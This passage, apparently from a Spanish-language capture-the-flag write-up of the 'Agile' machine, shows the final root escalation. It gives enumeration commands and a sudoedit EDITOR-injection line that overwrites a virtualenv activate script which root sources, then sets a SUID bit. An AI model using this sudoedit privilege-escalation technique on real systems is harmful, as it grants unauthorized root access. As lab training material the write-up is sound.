+</span></span></code></pre></td></tr></table>
+</div>
+</div><br>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> find / -group dev_admin 2&gt; /dev/null
+</span></span></code></pre></td></tr></table>
+</div>
+</div><br>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/home/dev_admin
+</span></span><span class="line"><span class="cl">/app/venv
+</span></span><span class="line"><span class="cl">/app/venv/bin
+</span></span><span class="line"><span class="cl">/app/venv/bin/activate
+</span></span><span class="line"><span class="cl">/app/venv/bin/Activate.ps1
+</span></span><span class="line"><span class="cl">/app/venv/bin/activate.fish
+</span></span><span class="line"><span class="cl">/app/venv/bin/activate.csh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Buscando si se ejecuta algún proceso que implique alguno de estos archivos:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> ps aux <span class="p">|</span> grep venv
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Nos devuelve que se está ejecutando &ldquo;pytest&rdquo;. Recordando un fichero anterior de actualización:</p>
+<p><img src="/p/2023/agile-machine/agile11.png"
+	width="979"
+	height="791"
+	srcset="/p/2023/agile-machine/agile11_hu6e1766156a29bc347fbb0f1acb38ab85_87935_480x0_resize_box_3.png 480w, /p/2023/agile-machine/agile11_hu6e1766156a29bc347fbb0f1acb38ab85_87935_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="123"
+		data-flex-basis="297px"
+	
+></p>
+<p>De alguna forma root debe ejecutar <code>source /app/venv/bin/activate</code> para poder ejecutar el test, por lo que aprovechando esto:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> sudo -u dev_admin <span class="nv">EDITOR</span><span class="o">=</span><span class="s1">&#39;vim -- /app/venv/bin/activate&#39;</span> sudoedit /app/config_test.json
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Damos permisos SUID:</p>
+<p><img src="/p/2023/agile-machine/agile12.png"
+	width="1050"
+	height="420"
+	srcset="/p/2023/agile-machine/agile12_hu4d5afba142b418b93cae62941836b998_51303_480x0_resize_box_3.png 480w, /p/2023/agile-machine/agile12_hu4d5afba142b418b93cae62941836b998_51303_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="250"
+		data-flex-basis="600px"
+	
+></p>
+<p>Y con esto finalizamos la máquina y obtenemos permisos de administrador.</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/lfi/">lfi</a>
+        
+            <a href="/tags/werkzeug/">werkzeug</a>
+        
+            <a href="/tags/flask/">flask</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Contenidos relacionados</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/2023/inject-machine/">
+        
+        
+            <div class="article-image">
+                <img src="/p/2023/inject-machine/landing.846d1b81029f5090a56a1b5ddc843dce.png" 
+                        width="1920" 
+                        height="1080" 
+                        loading="lazy"
+                        alt="Featured image of post Inject Machine"
+                        
+                        data-hash="md5-hG0bgQKfUJClahtd3IQ9zg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Inject Machine</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2023/squashed-machine/">
+        
+        
+            <div class="article-image">
+                <img src="/p/2023/squashed-machine/landing.03fa6e1a4cb646a3b1744e0aebe9f181.png" 
+                        width="1920" 
+                        height="1080" 
+                        loading="lazy"
+                        alt="Featured image of post Squashed Machine"
+                        
+                        data-hash="md5-A/puGky2RqOxdE4K6&#43;nxgQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Squashed Machine</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2023/investigation-machine/">
+        
+        
+            <div class="article-image">
+                <img src="/p/2023/investigation-machine/landing.fa199150ea6f47324621476288962779.png" 
+                        width="1920" 
+                        height="1080" 
+                        loading="lazy"
+                        alt="Featured image of post Investigation Machine"
+                        
+                        data-hash="md5-&#43;hmRUOpvRzJGIUdiiJYneQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Investigation Machine</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2023/metatwo-machine/">
+        
+        
+            <div class="article-image">
+                <img src="/p/2023/metatwo-machine/landing.4ab57de3831f316fac9172831f1faf3b.png" 
+                        width="1920" 
+                        height="1080" 
+                        loading="lazy"
+                        alt="Featured image of post MetaTwo Machine"
+                        
+                        data-hash="md5-SrV944MfMW&#43;skXKDHx&#43;vOw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MetaTwo Machine</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2023/soccer-machine/">
+        
+        
+            <div class="article-image">
+                <img src="/p/2023/soccer-machine/landing.55ef91476fa5ae5d0e802d2cb0908ec2.png" 
+                        width="1920" 
+                        height="1080" 
+                        loading="lazy"
+                        alt="Featured image of post Soccer Machine"
+                        
+                        data-hash="md5-Ve&#43;RR2&#43;lrl0OgC0ssJCOwg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Soccer Machine</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2023 4rtic f0x
+    </section>
+    
+    <section class="powerby">
+        Tema <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> diseñado por <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
